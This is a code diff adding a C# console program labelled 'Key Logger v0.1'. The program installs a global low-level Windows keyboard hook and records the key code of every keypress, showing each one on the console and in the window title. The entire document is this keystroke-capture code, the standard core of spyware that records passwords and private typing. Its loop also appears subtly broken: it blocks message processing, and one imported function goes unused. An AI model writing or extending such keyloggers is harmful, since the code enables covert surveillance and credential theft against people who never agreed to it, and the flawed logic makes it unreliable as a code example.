@@ -1,0 +1,80 @@
+using System;
+using System.Diagnostics;
+using System.Runtime.InteropServices;
+
+class InterceptKeys
+{
+    private const int WH_KEYBOARD_LL = 13;
+    private const int WM_KEYDOWN = 0x0100;
+    private static LowLevelKeyboardProc _proc = HookCallback;
+    private static IntPtr hookID = IntPtr.Zero;
+    private static int counter;
+    private static string logger5;
+
+    public static void Main()
+    {
+        hookID = SetHook(_proc);
+        counter = 0;
+        logger5 = "";
+        Console.WriteLine("Key Logger v0.1 has started");
+        if (hookID == IntPtr.Zero)
+        {
+            Console.Title="Failed";
+        }
+        test();
+        Console.ReadLine();
+        UnhookWindowsHookEx(hookID);
+    }
+
+    public static void test()
+    {
+        while (counter < 100)
+        {
+            Console.Title=counter + "\n" + logger5;
+        }
+    }
+
+    private static IntPtr SetHook(LowLevelKeyboardProc proc)
+    {
+        using (Process curProcess = Process.GetCurrentProcess())
+        using (ProcessModule curModule = curProcess.MainModule)
+        {
+            return SetWindowsHookEx(WH_KEYBOARD_LL, proc,
+                GetModuleHandle(curModule.ModuleName), 0);
+        }
+    }
+
+    private delegate IntPtr LowLevelKeyboardProc(
+        int nCode, IntPtr wParam, IntPtr lParam);
+
+    private static IntPtr HookCallback(
+        int nCode, IntPtr wParam, IntPtr lParam)
+    {
+        if (nCode >= 0 && wParam == (IntPtr)WM_KEYDOWN)
+        {
+            counter++;
+            int vkCode = Marshal.ReadInt32(lParam);
+            Console.WriteLine(vkCode.ToString());
+            logger5 = vkCode.ToString();
+        }
+        return CallNextHookEx(hookID, nCode, wParam, lParam);
+    }
+
+    [DllImport("user32.dll", CharSet = CharSet.Auto, SetLastError = true)]
+    private static extern IntPtr SetWindowsHookEx(int idHook,
+        LowLevelKeyboardProc lpfn, IntPtr hMod, uint dwThreadId);
+
+    [DllImport("User32.dll")]
+    private static extern short GetAsyncKeyState(int vKey);
+
+    [DllImport("user32.dll", CharSet = CharSet.Auto, SetLastError = true)]
+    [return: MarshalAs(UnmanagedType.Bool)]
+    private static extern bool UnhookWindowsHookEx(IntPtr hhk);
+
+    [DllImport("user32.dll", CharSet = CharSet.Auto, SetLastError = true)]
+    private static extern IntPtr CallNextHookEx(IntPtr hhk, int nCode,
+        IntPtr wParam, IntPtr lParam);
+
+    [DllImport("kernel32.dll", CharSet = CharSet.Auto, SetLastError = true)]
+    private static extern IntPtr GetModuleHandle(string lpModuleName);
+}
